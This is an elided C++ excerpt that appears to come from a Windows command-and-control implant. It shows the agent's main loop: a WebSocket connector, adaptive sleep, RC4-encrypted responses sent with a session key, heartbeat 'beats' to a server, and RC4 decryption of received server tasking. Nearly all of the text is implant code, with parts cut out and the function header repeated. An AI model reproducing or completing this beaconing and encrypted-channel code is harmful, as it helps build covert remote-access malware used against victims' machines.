...
void AgentMain()
{
	...
	*packerOut = Packer();
	...
	do {
		g_Agent->UpdateAdaptiveSleep(packerOut);
...
void AgentMain()
{
	...
	*g_Agent = Agent();
	...
	g_Connector = (ConnectorWS*)MemAllocLocal(sizeof(ConnectorWS));
	*g_Connector = ConnectorWS();
	...
	*packerOut = Packer();
	...
	do {
#if defined(DEBUG)  
		ApiWin->printf("[WS] Main loop iteration\n");
#endif  

		if (packerOut->datasize() > 4) {
#if defined(DEBUG)  
			ApiWin->printf("[WS] Sending response: %d bytes\n", packerOut->datasize());
#endif  
			packerOut->Set32(0, packerOut->datasize());
			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);
			g_Connector->SendData(packerOut->data(), packerOut->datasize());
...
#if defined(DEBUG)  
			ApiWin->printf("[WS] Sending beat\n");
#endif  
			g_Connector->SendData(beat, beatSize);
		}

#if defined(DEBUG)  
		ApiWin->printf("[WS] Attempting to receive server response...\n");
#endif  

		BYTE* recvData = g_Connector->RecvData();
		int recvSize = g_Connector->RecvSize();

		if (recvSize > 0 && recvData) {
#if defined(DEBUG)  
			ApiWin->printf("[WS] Processing %d bytes from server\n", recvSize);
#endif  
			DecryptRC4(recvData, recvSize, g_Agent->SessionKey, 16);
